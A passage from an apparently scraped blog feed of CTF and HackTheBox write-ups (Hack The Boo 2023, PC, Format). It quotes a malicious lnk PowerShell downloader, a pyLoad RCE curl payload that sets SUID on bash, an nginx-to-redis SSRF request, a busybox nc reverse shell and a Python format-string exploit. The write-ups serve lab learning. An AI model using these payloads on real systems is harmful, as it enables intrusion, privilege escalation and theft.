Because of the docker files, we know the flag exists at the base directory, outside app:\n1 2 3 4 5 6 $ cat ../Dockerfile FROM alpine:3.18.3 \u0026lt;...SNIP...\u0026gt; # Copy flag COPY flag.txt /flag.txt Making the html file:\n1 2 3 4 5 6 7 8 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;body\u0026gt; {{.OutFileContents \u0026#34;/flag.txt\u0026#34;}} \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Running a local test is very simple, as we can use our internal IP address and a python server:\n1 2 $ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... My internal IP is 192.168.0.164, so I can reach this by entering the link as http://192.168.0.164/test.html. When we visit, we get the test flag!\nThis is all great for testing, but the CTF machine will not be able to reach us if we try supplying the previous IP address. We need to use something such as ngrok that can allow our server to be publicly accessible.\nForensics Trick or Treat Another night staying alone at home during Halloween. But someone wanted to play a Halloween game with me. They emailed me the subject \u0026ldquo;Trick or Treat\u0026rdquo; and an attachment. When I opened the file, a black screen appeared for a second on my screen. It wasn\u0026rsquo;t so scary; maybe the season is not so spooky after all.\nWe are given a traffic capture file (pcap) and a lnk file, presumably the \u0026ldquo;malicious\u0026rdquo; link that our buddy fell for. First, examining the lnk file:\n1 2 3 $ cat trick_or_treat.lnk L�F�@FC5P�O� �:i�+00�/C:\\V1Windows@ �.WindowsZ1system32B �.system32V2cmd.exe@ �.cmd.exeTrick or treatC:�/k for /f \u0026#34;tokens=*\u0026#34; %a in (\u0026#39;dir C:\\Windows\\SysWow64\\WindowsPowerShell\\v1.0\\*rshell.exe /s /b /od\u0026#39;) do call %a -windowstyle hidden \u0026#34;$asvods =\u0026#39;\u0026#39;;$UserAgents = @(\u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\u0026#39;,\u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/15.15063\u0026#39;,\u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\u0026#39;);$RandomUserAgent = $UserAgents | Get-Random;$WebClient = New-Object System.Net.WebClient;$WebClient.Headers.Add(\u0026#39;User-Agent\u0026#39;, $RandomUserAgent);$boddmei = $WebClient.DownloadString(\u0026#39;http://windowsliveupdater.com\u0026#39;);$vurnwos =\u0026#39;\u0026#39;;for($i=0;$i -le $boddmei.Length-2;$i=$i+2){$bodms=$boddmei[$i]+$boddmei[$i+1];$decodedChar = [char]([convert]::ToInt16($bodms, 16));$xoredChar=[char]([byte]($decodedChar) -bxor 0x1d);$vurnwos = $vurnwos + $xoredChar};Invoke-Command -ScriptBlock ([Scriptblock]::Create($vurnwos));Invoke-Command -ScriptBlock ([Scriptblock]::Create($asvods));C:\\Windows\\System32\\shell32.dll�%SystemRoot%\\System32\\shell32.dll%SystemRoot%\\System32\\shell32.dll�%� �wN���]N�D.��Q���� ��1SPS�XF�L8C���\u0026amp;�m�m.S-1-5-21-3849600975-1564034632-632203374-1001 We can see very clearly that a request is being sent to http://windowsliveupdater.com. We know where communication was being sent, but it looks as though the data is being manipulated as we can see with the xor function, $xoredChar=[char]([byte]($decodedChar) -bxor 0x1d);$vurnwos = $vurnwos + $xoredChar};. When we examine the network traffic data with Wireshark, we see only one data object associated with windowsliveupdater.com, which makes the process easier.\nIf we follow this stream, we can see a large chunk of data, clearly encoded:\nAfter spending some time trying to reverse the encoding steps listed from our lnk file, I wasn\u0026rsquo;t getting a reasonable answer. Those with a sharp eye, however, might have noticed right away that this data chunk is being sent from the target, to our victim. Meaning, the decoding actions done in the lnk file is the way to decode. Instead of reversing the steps, we just need to replicate them. In powershell:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 PS C:\\Users\\Flare\\Desktop\\forensics_trick_or_treat\\trick_or_treat\u0026gt; $boddmei = \u0026#34;7b68737e697472733d596f726d5f726530486d71727c793d661717465e70797178695f7473797473\u0026lt;...SNIP...\u0026gt;7c791760\u0026#34;;$vurnwos =\u0026#39;\u0026#39;;for($i=0;$i -le $boddmei.Length-2;$i=$i+2){$bodms=$boddmei[$i]+$boddmei[$i+1];$decodedChar = [char]([convert]::ToInt16($bodms, 16));$xoredChar=[char]([byte]($decodedChar) -bxor 0x1d);$vurnwos = $vurnwos + $xoredChar} PS C:\\Users\\Flare\\Desktop\\forensics_trick_or_treat\\trick_or_treat\u0026gt; echo $vurnwos function DropBox-Upload { [CmdletBinding()] param ( [Parameter (Mandatory = $True, ValueFromPipeline = $True)] [Alias(\u0026#34;f\u0026#34;)] [string]$SourceFilePath ) $DropBoxAccessToken = \u0026#34;HTB{s4y_Pumpk1111111n!!!}\u0026#34; $outputFile = Split-Path $SourceFilePath -leaf When we echo the decoded $vurnwos, the message is properly decoded!\n","date":"2023-10-30T17:08:25-05:00","permalink":"https://yuwenmichael.netlify.app/post/hack-the-boo-2023/","title":"Hack The Boo 2023"},{"content":"Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Nmap scan report for 10.10.11.214 Host is up (0.047s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA) | 256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA) |_ 256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519) 50051/tcp open unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi? \u0026lt;...SNIP...\u0026gt; Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 205.03 seconds There is very little information right out the gate, only a port that nmap fails to identify. However, quick google searching shows that this port is used in gRPC API. Interacting with it requires a specific protocol, so we need to use a tailored program. While I initially started enumeration with grpc_cli and this resource, I had a lot of trouble passing a login token and switched to Postman API. As such, I will cover only using Postman from the beginning.\nInteracting with gRPC via Postman To use, simply extract the tarball and run Postman binary:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ┌──(kali㉿kali)-[~/Documents/pc] └─$ tar -xvf postman-linux-x64.tar.gz Postman/ Postman/app/ Postman/app/icons/ \u0026lt;...SNIP...\u0026gt; Postman/app/locales/ru.pak Postman/Postman ┌──(kali㉿kali)-[~/Documents/pc] └─$ cd Postman ┌──(kali㉿kali)-[~/Documents/pc/Postman] └─$ ls app Postman ┌──(kali㉿kali)-[~/Documents/pc/Postman] └─$ ./Postman The GUI will open up, and we can create an account or skip for now: We can set up our request first by selecting gRPC: Now when we supply the URL, API methods will be loaded automatically thanks to server reflection query: First, we can try to register a user. Once again, the query is made easy with Postman\u0026rsquo;s \u0026ldquo;use example message\u0026rdquo; feature. It will create for us a structured JSON message with all necessary parameters. For my account, I edited the example to have a username/password of asdf. Next, we can log in. The server responds with giving us an id number. Notice also, the Trailers tab. This will contain our login token, which we must supply for logged-in activities. Selecting the Trailers tab we can view: To use this token, we can go to the Metadata tab, and add the key as \u0026rsquo;token\u0026rsquo; and the value the copied value from Trailers, omitting the b\u0026rsquo;\u0026rsquo;. Finally, we can use the getInfo function. \u0026ldquo;Use Example Message\u0026rdquo; will again auto-suggest a valid JSON request, that we can use to supply our own id value: SQL Injection in getInfo function After trying several things, we might learn that this API is vulnerable to SQL injection. In the below example, I use UNION injection to insert the number \u0026lsquo;1\u0026rsquo; in the response: First, we can determine the database type by enumerating versions. This way, I find that the service is using sqlite: Using a query from PayloadAllTheThings, I am able to dump databases. We are likely already seeing messages, and accounts will have interesting information. Next, enumerating the columns in table accounts: Seeing \\n\\t simply refers to a newline, followed by tab indentation. There are 2 column entries, username and password. First, finding password: Now with a password, we can find a matching username: Although we have a username, this does not really seem like a password that a user \u0026lsquo;admin\u0026rsquo; would have. With my current injection, I am just retrieving the first entry in the username field. However, we can be extra sure to match the username \u0026amp; password by using WHERE: Finally, we have a credential pair of sau:HereIsYourPassWord1431. Fortunately, this is enough to gain entry into the system. We are able to use ssh:\n1 2 3 4 5 ┌──(kali㉿kali)-[~/Documents/Academy/sysmon] └─$ ssh sau@10.10.11.214 \u0026lt;...SNIP..\u0026gt; sau@pc:~$ id uid=1001(sau) gid=1001(sau) groups=1001(sau) Privilege Escalation Internal web server pyLoad Enumerating open ports, we find an internal port not available to us earlier:\n1 2 3 4 5 6 7 8 9 10 11 sau@pc:~$ netstat -ntlp (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:9666 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::50051 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - Port 8000 is common for web applications. We can do a very fast and easy check with a curl request:\n1 2 3 4 5 6 sau@pc:~$ curl localhost:8000 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=en\u0026gt; \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;You should be redirected automatically to the target URL: \u0026lt;a href=\u0026#34;/login?next=http%3A%2F%2Flocalhost%3A8000%2F\u0026#34;\u0026gt;/login?next=http%3A%2F%2Flocalhost%3A8000%2F\u0026lt;/a\u0026gt;. If not, click the link. There is a webpage here, and we can see already that there is login involved. In order to get a better view, we can utilize ssh port forwarding:\n1 $ ssh -L 8000:localhost:8000 sau@10.10.11.214 Now when we visit localhost:8000 in our browser, we can see the web login page: A few basic credential attempts did not work.\nRCE as root from pyLoad vulnerability (CVE-2023-0297) Searching a little more, I find this report on unauthenticated RCE in pyLoad. Although I wasn\u0026rsquo;t finding an easy way to see pyLoad\u0026rsquo;s version number, the exploit does not seem volitile, and so I gave it a shot. Note that the payload has been altered to be pyimport os;os.system(\u0026quot;chmod +s /bin/bash\u0026quot;), which is different from the article.\n1 curl -i -s -k -X $\u0026#39;POST\u0026#39; -H $\u0026#39;Host: 127.0.0.1:8000\u0026#39; -H $\u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -H $\u0026#39;Content-Length: 184\u0026#39; --data-binary $\u0026#39;package=xxx\u0026amp;crypted=AAAA\u0026amp;jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%63%68%6d%6f%64%20%2b%73%20%2f%62%69%6e%2f%62%61%73%68%22%29;f=function%20f2(){};\u0026amp;passwords=aaaa\u0026#39; $\u0026#39;http://127.0.0.1:8000/flash/addcrypted2\u0026#39; Executing the command as user sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 sau@pc:/opt/app$ curl -i -s -k -X $\u0026#39;POST\u0026#39; -H $\u0026#39;Host: 127.0.0.1:8000\u0026#39; -H $\u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -H $\u0026#39;Content-Length: 184\u0026#39; --data-binary $\u0026#39;package=xxx\u0026amp;crypted=AAAA\u0026amp;jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%63%68%6d%6f%64%20%2b%73%20%2f%62%69%6e%2f%62%61%73%68%22%29;f=function%20f2(){};\u0026amp;passwords=aaaa\u0026#39; $\u0026#39;http://127.0.0.1:8000/flash/addcrypted2\u0026#39; HTTP/1.1 500 INTERNAL SERVER ERROR Content-Type: text/html; charset=utf-8 Content-Length: 21 Access-Control-Max-Age: 1800 Access-Control-Allow-Origin: * Access-Control-Allow-Methods: OPTIONS, GET, POST Vary: Accept-Encoding Date: Thu, 05 Oct 2023 01:35:19 GMT Server: Cheroot/8.6.0 Could not decrypt sau@pc:/opt/app$ bash -p bash-5.0# whoami root Looks like pyLoad is vulnerable, and we are now root!\nReflection I found this box to be simple and clean, without much distractions. Interacting with gRPC was the biggest challenge, and I still find it annoying that using grpc-cli was so problematic. However, once the worst is passed, exploiting the vulnerabilities was quite stress-free.\n","date":"2023-10-07T10:18:48-05:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-pc/PC_huab04e65fab2e39d7ab0f3d51815d3af7_248053_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-pc/","title":"HackTheBox - PC"},{"content":"Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 Nmap scan report for 10.10.11.213 Host is up (0.048s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 c3:97:ce:83:7d:25:5d:5d:ed:b5:45:cd:f2:0b:05:4f (RSA) | 256 b3:aa:30:35:2b:99:7d:20:fe:b6:75:88:40:a5:17:c1 (ECDSA) |_ 256 fa:b3:7d:6e:1a:bc:d1:4b:68:ed:d6:e8:97:67:27:d7 (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: nginx/1.18.0 3000/tcp open http nginx 1.18.0 |_http-title: Did not follow redirect to http://microblog.htb:3000/ |_http-server-header: nginx/1.18.0 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.19 seconds There is an interesting web port 3000, and it redirects to microblog.htb. I will add this to my /etc/hosts file:\n1 2 3 4 5 6 7 8 9 ┌──(kali㉿kali)-[~/Documents/Format] └─$ tail /etc/hosts 127.0.0.1 localhost 127.0.1.1 kali ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.10.11.213 microblog.htb Visiting the page is a git server: Web server source code found on port 3000 Exploring for public repositories, we find a microblog repo by cooper: I don\u0026rsquo;t find any cleartext credentials, but I do find another subdomain on the index.html file:\n1 2 3 4 5 6 7 8 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Refresh\u0026#34; content=\u0026#34;0; url=\u0026#39;http://app.microblog.htb\u0026#39;\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; When trying to visit the main site on port 80, we are also redirected again to app.microblog.htb, so this should be added to /etc/hosts as well.\nEnumerating the main web server The main page is a blogging website. There are options to log in or register: Registering with the classic asdf credentials: With an account, we can create blog subdomains: The source code in the repository found at port 3000 is utilized by this website. We can explore the code, and potentially find vulnerabilities in how the program behaves.\nDiscovering file write vulnerability in source code Under the edit page, the command to add text will write our contents to an id field:\n1 2 3 4 5 6 7 8 9 10 11 12 //add text if (isset($_POST[\u0026#39;txt\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;id\u0026#39;])) { chdir(getcwd() . \u0026#34;/../content\u0026#34;); $txt_nl = nl2br($_POST[\u0026#39;txt\u0026#39;]); $html = \u0026#34;\u0026lt;div class = \\\u0026#34;blog-text\\\u0026#34;\u0026gt;{$txt_nl}\u0026lt;/div\u0026gt;\u0026#34;; $post_file = fopen(\u0026#34;{$_POST[\u0026#39;id\u0026#39;]}\u0026#34;, \u0026#34;w\u0026#34;); fwrite($post_file, $html); fclose($post_file); $order_file = fopen(\u0026#34;order.txt\u0026#34;, \u0026#34;a\u0026#34;); fwrite($order_file, $_POST[\u0026#39;id\u0026#39;] . \u0026#34;\\n\u0026#34;); fclose($order_file); header(\u0026#34;Location: /edit?message=Section added!\u0026amp;status=success\u0026#34;); id will determine the path, and since this is not path protected, we can choose any place we like. This is Arbitrary File Write, an extremely dangerous oversight. However, this seems largely mitigated by removing write permissions in other folders.\nAlso under the edit page, we can see that if isPro is set, there exists a folder that retains writing privileges:\n1 2 3 4 5 6 7 8 9 10 11 function provisionProUser() { if(isPro() === \u0026#34;true\u0026#34;) { $blogName = trim(urldecode(getBlogName())); system(\u0026#34;chmod +w /var/www/microblog/\u0026#34; . $blogName); system(\u0026#34;chmod +w /var/www/microblog/\u0026#34; . $blogName . \u0026#34;/edit\u0026#34;); system(\u0026#34;cp /var/www/pro-files/bulletproof.php /var/www/microblog/\u0026#34; . $blogName . \u0026#34;/edit/\u0026#34;); system(\u0026#34;mkdir /var/www/microblog/\u0026#34; . $blogName . \u0026#34;/uploads \u0026amp;\u0026amp; chmod 700 /var/www/microblog/\u0026#34; . $blogName . \u0026#34;/uploads\u0026#34;); system(\u0026#34;chmod -w /var/www/microblog/\u0026#34; . $blogName . \u0026#34;/edit \u0026amp;\u0026amp; chmod -w /var/www/microblog/\u0026#34; . $blogName); } return; } After all commands are finished, we are left with an /uploads folder under our blog, with 700 permissions. The creator, in this case the web service account, can read/write/execute files within this location. The exploit chain is now clear. If we can trigger provisionProUser, we will be able to write a webshell in the uploads folder using Arbitrary File Write. This function is dependent on isPro() being set to true. Looking for isPro:\n1 2 3 4 5 6 7 8 9 function isPro() { if(isset($_SESSION[\u0026#39;username\u0026#39;])) { $redis = new Redis(); $redis-\u0026gt;connect(\u0026#39;/var/run/redis/redis.sock\u0026#39;); $pro = $redis-\u0026gt;HGET($_SESSION[\u0026#39;username\u0026#39;], \u0026#34;pro\u0026#34;); return strval($pro); } return \u0026#34;false\u0026#34;; } The program is utilizing a redis sock to store credentials and characteristics of accounts. When we check the register page to see how accounts are created, we can see pro is set to false when a user is created:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 if (isset($_POST[\u0026#39;first-name\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;last-name\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;password\u0026#39;])) { if(!preg_match(\u0026#39;/^[a-zA-Z\\-]+$/\u0026#39;, $_POST[\u0026#39;first-name\u0026#39;]) || strlen($_POST[\u0026#39;first-name\u0026#39;]) \u0026gt; 50) { print_r(\u0026#34;Invalid first name\u0026#34;); \u0026lt;...SNIP...\u0026gt; else { $redis-\u0026gt;HSET(trim($_POST[\u0026#39;username\u0026#39;]), \u0026#34;username\u0026#34;, trim($_POST[\u0026#39;username\u0026#39;])); $redis-\u0026gt;HSET(trim($_POST[\u0026#39;username\u0026#39;]), \u0026#34;password\u0026#34;, trim($_POST[\u0026#39;password\u0026#39;])); $redis-\u0026gt;HSET(trim($_POST[\u0026#39;username\u0026#39;]), \u0026#34;first-name\u0026#34;, trim($_POST[\u0026#39;first-name\u0026#39;])); $redis-\u0026gt;HSET(trim($_POST[\u0026#39;username\u0026#39;]), \u0026#34;last-name\u0026#34;, trim($_POST[\u0026#39;last-name\u0026#39;])); $redis-\u0026gt;HSET(trim($_POST[\u0026#39;username\u0026#39;]), \u0026#34;pro\u0026#34;, \u0026#34;false\u0026#34;); //not ready yet, license keys coming soon $_SESSION[\u0026#39;username\u0026#39;] = trim($_POST[\u0026#39;username\u0026#39;]); header(\u0026#34;Location: /dashboard?message=Registration successful!\u0026amp;status=success\u0026#34;); } } Looking at the nmap port scan, we don\u0026rsquo;t see an open port that might be related to redis. So we cannot bypass the registration page and communicate with redis directly, or can we?\nFoothold SSRF to redis database via nginx misconfiguration This article covers how we might abuse poor configuration in nginx\u0026rsquo;s proxy_pass settings, allowing us to send commands directly to the redis socket.\nreferring to the source code, we see new account information is set with the HSET request type, as opposed to the article\u0026rsquo;s MSET. After making the asdf account like normal, we can hopefully change the pro key to \u0026ldquo;True\u0026rdquo; by sending another request. For this, I chose to craft a curl request. Note that the redis socket location is replicated from the isPro function shown earlier.\n1 2 3 4 5 6 7 8 9 ┌──(kali㉿kali)-[~/Documents/Format] └─$ curl -X \u0026#34;HSET\u0026#34; http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:%22asdf%22%20pro%20%22true%22%20/js/jquery.js \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;502 Bad Gateway\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;502 Bad Gateway\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.18.0\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Despite the error, we can see that we have become a pro user with our new star badge:\nArbitrary File Write to create a webshell Next, writing a basic php webshell into uploads/rev.php:\nVerifying webshell upload:\nSince the blog pages are reset frequently, it is best to transition to a reverse shell. A simple payload using busybox:\n1 http://testa.microblog.htb/uploads/rev.php?cmd=busybox%20nc%2010.10.14.8%208888%20-e%20/bin/bash and on our listener, we now have a reverse connection:\n1 2 3 4 5 6 7 ┌──(kali㉿kali)-[~/Documents/Format] └─$ nc -nvlp 8888 listening on [any] 8888 ... connect to [10.10.14.8] from (UNKNOWN) [10.10.11.213] 58190 id uid=33(www-data) gid=33(www-data) groups=33(www-data) Lateral Movement Enumerating redis database Reviewing the user cooper\u0026rsquo;s home directory, we see a rediscli_history. Although unreadable, it is notable that redis is being used by more than just the web server. We can attach to the redis socket ourselves to enumerate:\n1 www-data@format:/var/lib/redis$ redis-cli -s /var/run/redis/redis.sock When enumerating redis keys, we see a couple entries for cooper, a user on the system. Note if we reached this place faster, we could also see an entry for our asdf user. However, account entries are reset quickly for a cleaner box experience.\n1 2 3 redis /var/run/redis/redis.sock\u0026gt; KEYS \u0026#39;*\u0026#39; 1) \u0026#34;cooper.dooper:sites\u0026#34; 2) \u0026#34;cooper.dooper\u0026#34; After reviewing This stack overflow post, I find that i can retrieve key contents by matching the type. Finding type:\n1 2 3 4 redis /var/run/redis/redis.sock\u0026gt; type \u0026#34;cooper.dooper:sites\u0026#34; list redis /var/run/redis/redis.sock\u0026gt; type \u0026#34;cooper.dooper\u0026#34; hash Hash is more interesting, as it is likely related to passwords. Each type requires a different command to print:\n1 2 3 4 5 6 7 8 9 10 11 redis /var/run/redis/redis.sock\u0026gt; hgetall \u0026#34;cooper.dooper\u0026#34; 1) \u0026#34;username\u0026#34; 2) \u0026#34;cooper.dooper\u0026#34; 3) \u0026#34;password\u0026#34; 4) \u0026#34;zooperdoopercooper\u0026#34; 5) \u0026#34;first-name\u0026#34; 6) \u0026#34;Cooper\u0026#34; 7) \u0026#34;last-name\u0026#34; 8) \u0026#34;Dooper\u0026#34; 9) \u0026#34;pro\u0026#34; 10) \u0026#34;false\u0026#34; The hash is indeed the interesting entry, and more surprisingly the password is not hashed at all! We can try to use this to authenticate as cooper using ssh:\n1 2 3 4 5 ┌──(kali㉿kali)-[~/Documents/Format] └─$ ssh cooper@microblog.htb cooper@microblog.htb\u0026#39;s password: \u0026lt;...SNIP...\u0026gt; cooper@format:~$ Privilege Escalation Abusing Python String format() Checking sudo privileges:\n1 2 3 4 5 6 7 cooper@format:~$ sudo -l [sudo] password for cooper: Matching Defaults entries for cooper on format: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User cooper may run the following commands on format: (root) /usr/bin/license This binary is custom built for this box:\n1 2 3 cooper@format:~$ /usr/bin/license Microblog license key manager can only be run as root Upon further inspection, it is not a binary, but instead a python script. This means we can read the contents.\n1 2 cooper@format:~$ file /usr/bin/license /usr/bin/license: Python script, ASCII text executable Full code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 #!/usr/bin/python3 import base64 from cryptography.hazmat.backends import default_backend from cryptography.hazmat.primitives import hashes from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC from cryptography.fernet import Fernet import random import string from datetime import date import redis import argparse import os import sys class License(): def __init__(self): chars = string.ascii_letters + string.digits + string.punctuation self.license = \u0026#39;\u0026#39;.join(random.choice(chars) for i in range(40)) self.created = date.today() if os.geteuid() != 0: print(\u0026#34;\u0026#34;) print(\u0026#34;Microblog license key manager can only be run as root\u0026#34;) print(\u0026#34;\u0026#34;) sys.exit() parser = argparse.ArgumentParser(description=\u0026#39;Microblog license key manager\u0026#39;) group = parser.add_mutually_exclusive_group(required=True) group.add_argument(\u0026#39;-p\u0026#39;, \u0026#39;--provision\u0026#39;, help=\u0026#39;Provision license key for specified user\u0026#39;, metavar=\u0026#39;username\u0026#39;) group.add_argument(\u0026#39;-d\u0026#39;, \u0026#39;--deprovision\u0026#39;, help=\u0026#39;Deprovision license key for specified user\u0026#39;, metavar=\u0026#39;username\u0026#39;) group.add_argument(\u0026#39;-c\u0026#39;, \u0026#39;--check\u0026#39;, help=\u0026#39;Check if specified license key is valid\u0026#39;, metavar=\u0026#39;license_key\u0026#39;) args = parser.parse_args() r = redis.Redis(unix_socket_path=\u0026#39;/var/run/redis/redis.sock\u0026#39;) secret = [line.strip() for line in open(\u0026#34;/root/license/secret\u0026#34;)][0] secret_encoded = secret.encode() salt = b\u0026#39;microblogsalt123\u0026#39; kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend()) encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded)) f = Fernet(encryption_key) l = License() #provision if(args.provision): user_profile = r.hgetall(args.provision) if not user_profile: print(\u0026#34;\u0026#34;) print(\u0026#34;User does not exist. Please provide valid username.\u0026#34;) print(\u0026#34;\u0026#34;) sys.exit() existing_keys = open(\u0026#34;/root/license/keys\u0026#34;, \u0026#34;r\u0026#34;) all_keys = existing_keys.readlines() for user_key in all_keys: if(user_key.split(\u0026#34;:\u0026#34;)[0] == args.provision): print(\u0026#34;\u0026#34;) print(\u0026#34;License key has already been provisioned for this user\u0026#34;) print(\u0026#34;\u0026#34;) sys.exit() prefix = \u0026#34;microblog\u0026#34; username = r.hget(args.provision, \u0026#34;username\u0026#34;).decode() firstlast = r.hget(args.provision, \u0026#34;first-name\u0026#34;).decode() + r.hget(args.provision, \u0026#34;last-name\u0026#34;).decode() license_key = (prefix + username + \u0026#34;{license.license}\u0026#34; + firstlast).format(license=l) print(\u0026#34;\u0026#34;) print(\u0026#34;Plaintext license key:\u0026#34;) print(\u0026#34;------------------------------------------------------\u0026#34;) print(license_key) print(\u0026#34;\u0026#34;) license_key_encoded = license_key.encode() license_key_encrypted = f.encrypt(license_key_encoded) print(\u0026#34;Encrypted license key (distribute to customer):\u0026#34;) print(\u0026#34;------------------------------------------------------\u0026#34;) print(license_key_encrypted.decode()) print(\u0026#34;\u0026#34;) with open(\u0026#34;/root/license/keys\u0026#34;, \u0026#34;a\u0026#34;) as license_keys_file: license_keys_file.write(args.provision + \u0026#34;:\u0026#34; + license_key_encrypted.decode() + \u0026#34;\\n\u0026#34;) #deprovision if(args.deprovision): print(\u0026#34;\u0026#34;) print(\u0026#34;License key deprovisioning coming soon\u0026#34;) print(\u0026#34;\u0026#34;) sys.exit() #check if(args.check): print(\u0026#34;\u0026#34;) try: license_key_decrypted = f.decrypt(args.check.encode()) print(\u0026#34;License key valid! Decrypted value:\u0026#34;) print(\u0026#34;------------------------------------------------------\u0026#34;) print(license_key_decrypted.decode()) except: print(\u0026#34;License key invalid\u0026#34;) print(\u0026#34;\u0026#34;) The \u0026ldquo;misconfiguration\u0026rdquo; is far from obvious, and it is easy to overlook. However, this is where the namesake of the box \u0026ldquo;Format\u0026rdquo; comes into play: the vulnerability lies in how python handles content with the format function from the strings package. You can read more about the vulnerability here. Within our code, there is a format function for the license_key:\n1 license_key = (prefix + username + \u0026#34;{license.license}\u0026#34; + firstlast).format(license=l) Since username is something that we can influence, we will make a username with our payload:\n1 {license.__init__.__globals__} According to the article, this should display a list of all global variables for the python process when license_key is printed. Going through the registration page does not allow for odd characters, but now we can just access the database directly with redis-cli:\n1 2 redis /var/run/redis/redis.sock\u0026gt; HSET asdf username {license.__init__.__globals__} password asdf first-name asdf last-name asdf pro true (integer) 0 We can verify the change with another hgetall:\n1 2 3 4 5 6 7 8 9 10 11 redis /var/run/redis/redis.sock\u0026gt; hgetall asdf 1) \u0026#34;username\u0026#34; 2) \u0026#34;{license.__init__.__globals__}\u0026#34; 3) \u0026#34;password\u0026#34; 4) \u0026#34;asdf\u0026#34; 5) \u0026#34;first-name\u0026#34; 6) \u0026#34;asdf\u0026#34; 7) \u0026#34;last-name\u0026#34; 8) \u0026#34;asdf\u0026#34; 9) \u0026#34;pro\u0026#34; 10) \u0026#34;true\u0026#34; Now when we execute the license generation for user asdf, the format exploit triggers and all global variables are printed:\n1 2 3 4 5 6 cooper@format:~$ sudo /usr/bin/license -p asdf Plaintext license key: ------------------------------------------------------ microblog{\u0026#39;__name__\u0026#39;: \u0026#39;__main__\u0026#39;, \u0026#39;__doc__\u0026#39;: None, 